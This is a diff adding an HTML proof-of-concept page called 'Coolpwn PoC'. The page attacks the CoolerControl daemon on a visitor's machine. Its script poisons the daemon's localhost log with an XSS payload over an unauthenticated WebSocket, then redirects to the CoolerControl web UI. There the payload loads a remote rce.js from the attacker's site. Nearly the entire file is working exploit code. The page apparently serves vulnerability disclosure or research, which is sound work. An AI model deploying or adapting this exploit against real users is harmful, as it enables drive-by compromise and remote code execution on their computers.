@@ -1,0 +1,64 @@
+<!DOCTYPE html>
+<html>
+  <head>
+    <title>Coolpwn PoC</title>
+  </head>
+  <body>
+    <div style='text-align: center;'>
+      Proof of concept for a malicious website that targets Linux users with the CoolerControl daemon installed.<br>
+      <span id='countdown_text'></span> <span id='countdown_seconds'> </span>
+    </div>
+    <script>
+      async function pwn() {
+        // By default coolercontrold starts a web server on localhost port 11987
+        // https://docs.coolercontrol.org/getting-started.html
+        let cc_base_url = 'localhost:11987';
+        // Define an XSS payload here. In this example it loads a 3rd-party script rce.js from the same domain the PoC site is hosted on
+        // Inserted into head because couldnt get script tags to fire...
+        // https://security.stackexchange.com/questions/240353/how-is-it-possible-that-a-script-tag-was-injected-but-not-executed
+        let xss_source = location.protocol + '//' + location.host + '/rce.js';
+        let xss_payload =
+        '<img src=x onerror="script = document.createElement(\'script\');script.src = \''
+        + xss_source
+        + '\';document.head.appendChild(script);">';
+        let xss_payload_encoded = encodeURIComponent(xss_payload);
+        // Poison a log entry with the XSS payload (needs to be properly URL encoded). Does not need any authentication
+        // https://coolercontrol.org/openapi/#get-/custom-sensors/-custom_sensor_id-
+        // https://gitlab.com/coolercontrol/coolercontrol/-/blob/560a0e068d1a4c746c28e2f24fadf4603f905e49/coolercontrold/src/api/router.rs#L451
+        let cc_log_poisoning_payload_url = 'ws://' + cc_base_url + '/custom-sensors/' + xss_payload_encoded
+        // CoolerControl Web UI can view logs for coolercontrold
+        // Does not safely escape HTML, leading to XSS
+        // https://book.hacktricks.wiki/en/network-services-pentesting/pentesting-web/vuejs.html#v-html-directive
+        // https://gitlab.com/coolercontrol/coolercontrol/-/blob/560a0e068d1a4c746c28e2f24fadf4603f905e49/coolercontrol-ui/src/views/AppInfoView.vue#L350
+        let cc_log_firing_url = 'http://' + cc_base_url + '/#/app-info';
+        // very cool countdown for very cool 1337 poc effect
+        async function countdown(timeleft, text) {
+          return new Promise((resolve, reject) => {
+            let countdownTimer = setInterval(() => {
+              timeleft--;
+              console.log(timeleft)
+              document.getElementById(text).textContent = timeleft;
+
+              if (timeleft <= 0) {
+                clearInterval(countdownTimer);
+                resolve(true);
+              }
+            }, 1000);
+          });
+        }
+        // Create the countdown text
+        document.getElementById('countdown_text').textContent = 'System pwned in: ';
+        // Start the countown with 10 seconds
+        await countdown(10, 'countdown_seconds');
+        // Poison the log.
+        new WebSocket(cc_log_poisoning_payload_url);
+        console.log('coolercontrold log MAYBE poisoned with XSS...');
+        console.log('Redirecting to coolercontrol-ui to fire the poisoned log...');
+        // Redirect to fire
+        window.location.replace(cc_log_firing_url);
+      }
+      console.log('Malicious website starting pwn...');
+      pwn();
+    </script>
+  </body>
+</html>
